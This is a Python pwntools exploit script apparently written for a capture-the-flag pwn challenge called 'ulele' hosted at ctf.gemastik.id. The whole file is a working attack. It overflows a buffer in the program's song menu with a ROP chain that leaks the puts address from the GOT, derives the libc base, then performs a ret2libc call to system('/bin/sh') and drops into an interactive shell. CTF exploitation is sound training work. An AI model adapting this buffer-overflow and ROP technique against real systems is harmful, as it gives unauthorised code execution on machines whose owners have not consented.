#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './ulele_patched' # <-- change this
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'ctf.gemastik.id', 1313 # <-- change this

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *main+220
# break *main+141
'''.format(**locals())


# =========================================================
#                         NOTES
# =========================================================

def add_song(name: bytes, artist: bytes, length: bytes):
    io.sendlineafter(b': ', b'1')
    io.sendafter(b': ', name)
    io.sendafter(b': ', artist)
    io.sendlineafter(b': ', str(length))

def del_song(index: bytes):
    io.sendlineafter(b': ', b'2')
    io.sendlineafter(b': ', str(index))

def view_song(index: bytes):
    io.sendlineafter(b': ', b'3')
    io.sendlineafter(b': ', index)

def exitt():
    io.sendlineafter(b': ', b'4')


# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(libc)
    for i in range(99):
        add_song(b'bruh'*64, cyclic(254), 420)
        
    # 0x0000000000401792: mov rdi, rbp; nop; pop rbp; ret;
    mov_rdi_rbp_pop_rbp_ret = 0x401792
    
    payload = b'\x90' * 119 # just before rbp
    payload += p64(elf.got['puts']) # rbp -> rdi
    payload += p64(mov_rdi_rbp_pop_rbp_ret)
    payload += p64(0x0) # rbp
    payload += p64(elf.plt['puts']) # call puts, get leak
    payload += p64(elf.sym['_start']) # return to start
    payload = payload.ljust(256, b'\x90') # pad to 256
    
    add_song(b'bruh'*64, payload, 420)
    exitt() # trigger leak
    
    io.recvline()
    leak = u64(io.recvline().strip().ljust(8, b'\x00'))
    info(f'leak: {hex(leak)}')
    libc.address = leak - libc.sym['puts']
    
    del_song(100)
    
    # classic ret2libc
    payload = b'\x90' * 127
    payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0] + libc.address)
    payload += p64(next(libc.search(b'/bin/sh')))
    payload += p64(rop.find_gadget(['ret'])[0] + libc.address)
    payload += p64(libc.sym['system'])
    payload = payload.ljust(256, b'\x90')
    add_song(b'bruh'*64, payload, 420)
    exitt() # pray
    
    info(f'libc base: {hex(libc.address)}')
    
    io.interactive()
    
if __name__ == '__main__':
    exploit()